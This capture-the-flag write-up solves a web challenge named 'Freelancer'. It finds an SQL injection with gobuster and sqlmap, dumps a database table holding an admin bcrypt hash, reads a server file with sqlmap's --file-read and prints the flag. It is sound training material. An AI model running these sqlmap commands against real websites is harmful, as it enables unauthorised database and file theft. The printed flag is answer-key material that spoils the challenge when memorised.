# TITLE: Freelancer

## CHALLENGE INFOS

Type: Web

Server: 157.245.46.178:32726

Task: Can you test how secure my website is? Prove me wrong and capture the flag!

## FIRST THOUGHTS

It might be a SQL injection

I already saw the theme on start.bootstrap, maybe it's not that different

## ATTEMPS

Let's try using gobuster to scan the directories of the website

```bash

gobuster dir -u http://157.245.46.178:32726/ -w /usr/share/wordlists/dirb/big.txt

```

Here is the result

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://157.245.46.178:32726/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/01 04:19:42 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/administrat (Status: 301)
/css (Status: 301)
/favicon.ico (Status: 200)
/img (Status: 301)
/js (Status: 301)
/mail (Status: 301)
/robots.txt (Status: 200)
/server-status (Status: 403)
/vendor (Status: 301)
===============================================================
2020/12/01 04:21:26 Finished
===============================================================
```

We can see /administrat is really interesting

I tried to look up robots.txt, .htpasswor and .htaccess but wasn't able to read them

Then i tried to scan for .php and html files and found out that the server was running php code on backend

```bash
gobuster dir -u http://157.245.46.178:32726/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php, html
```

Let's search for /administrat/panel.php

![/administrat/index.php](/FreeLancer/login.png "/administrat/index.php")

As you can see the website redirects to /administrat/index.php which is a login page

Maybe it's running some sort of SQL Database on backend?

Let's search on the main page if we can find something

On the index.php page we can find this href

```html
<a href="portfolio.php?id=1">Portfolio 1</a>
```

We know for sure now it's running some SQL database

Let's try to get tables list with sqlmap

```bash
sqlmap -u http://157.245.46.178:32726/portfolio.php?id=1 --tables
```

Here is the result

```bash
[04:41:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:41:09] [INFO] fetching database names
[04:41:09] [INFO] fetching tables for databases: 'freelancer, information_schema, mysql, performance_schema'
Database: freelancer
[2 tables]
+----------------------------------------------------+
| portfolio                                          |
| safeadmin                                          |
+----------------------------------------------------+
```

We did find 2 tables!

Let's try now use sqlmap to scan the tables rows

```bash
sqlmap -u http://157.245.46.178:32726/portfolio.php?id=1 -T portfolio --dump
```

```bash
| id | name        | content
| 1  | Log Cabin 1 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
| 2  | Log Cabin 2 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
| 3  | Log Cabin 3 | Lorem ipsum dolor sit amet, consectetur adipisicing elit. Mollitia neque assumenda ipsam nihil, molestias magnam, recusandae quos quis inventore quisquam velit asperiores, vitae? Reprehenderit soluta, eos quod consequuntur itaque. Nam. |
```

We got it!

Now let's try for safeadmin

```sql
+----+--------------------------------------------------------------+----------+---------------------+
| id | password                                                     | username | created_at          |
+----+--------------------------------------------------------------+----------+---------------------+
| 1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 |
+----+--------------------------------------------------------------+----------+---------------------+
```

We got username and password but it's encrypted... I know for sure it's using some sort of BCrypt to hash the password but it's really hard to bruteforce the password

The last thing we can try is to get /administrat/panel.php page, maybe the flag is there?

## SOLUTION

```bash
sqlmap -u http://157.245.46.178:32726/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
```

```bash
[04:57:14] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:57:14] [INFO] fingerprinting the back-end DBMS operating system
[04:57:14] [INFO] the back-end DBMS operating system is Linux
[04:57:14] [INFO] fetching file: '/var/www/html/administrat/panel.php'
do you want confirmation that the remote file '/var/www/html/administrat/panel.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
[04:57:21] [INFO] the local file '/home/kali/.local/share/sqlmap/output/157.245.46.178/files/_var_www_html_administrat_panel.php' and the remote file '/var/www/html/administrat/panel.php' have the same size (880 B)
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/157.245.46.178/files/_var_www_html_administrat_panel.php (same file)

[04:57:21] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/157.245.46.178'

[*] ending @ 04:57:21 /2020-12-01/
```

So now if we cat the result file we should see panel.php page

```bash
cat /home/kali/.local/share/sqlmap/output/157.245.46.178/files/_var_www_html_administrat_panel.php
```

HERE IT IS:

```html
<body>
    <div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
<br><br><br>
        <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
    </div>
</body>
```

Flag: HTB{s4ff_3_1_w33b_fr4__l33nc_3}
